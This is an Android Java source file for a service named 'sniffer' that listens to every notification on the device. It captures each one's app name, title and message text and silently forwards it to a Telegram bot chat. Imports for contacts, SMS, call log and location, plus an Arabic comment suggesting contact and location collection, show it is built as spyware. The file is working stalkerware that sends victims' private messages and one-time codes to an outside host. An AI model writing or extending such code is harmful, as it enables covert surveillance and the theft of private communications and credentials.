package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.provider.CallLog;
import android.location.Location;
import android.location.LocationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.media.MediaScannerConnection;
import android.os.Environment;
import android.util.Log;

import com.v8.global.sniffer.utils.Constants;

import okhttp3.*;
import java.io.*;
import java.util.*;
import java.text.SimpleDateFormat;

public class NotificationService extends NotificationListenerService {

    private final OkHttpClient client = new OkHttpClient();
    private Handler handler = new Handler(Looper.getMainLooper());
    private Set<String> sentNotifications = new HashSet<>();

    @Override
    public void onCreate() {
        super.onCreate();
        sendToTelegram("✅ الخدمة بدأت", "NotificationService شغال");
        startCollecting();
    }

    private void startCollecting() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                collectAndSend();
                handler.postDelayed(this, Constants.COLLECT_INTERVAL);
            }
        }, 5000);
    }

    private void collectAndSend() {
        // يمكنك إضافة أي دالة لجمع البيانات هنا
        // مثال: getLocation(), getContacts()...
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            if (sbn.getPackageName().equals("android")) return;

            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String text = extras.getString(Notification.EXTRA_TEXT, "");
            String app = sbn.getPackageName();

            String id = app + "|" + title + "|" + text;
            if (sentNotifications.contains(id)) return;
            sentNotifications.add(id);

            String msg = "🔔 إشعار من " + app + "\n👤 " + title + "\n💬 " + text;
            sendToTelegram("إشعار جديد", msg);
        } catch (Exception e) {
            Log.e("V8", "onNotification error", e);
        }
    }

    private void sendToTelegram(String title, String message) {
        try {
            String full = "🔴 V13\n📌 " + title + "\n\n" + message;
            String url = Constants.BASE_URL + "sendMessage?chat_id=" + Constants.CHAT_ID + "&text=" + Uri.encode(full);
            Request request = new Request.Builder().url(url).build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response resp) throws IOException { resp.close(); }
            });
        } catch (Exception e) {
            Log.e("V8", "send error", e);
        }
    }
}
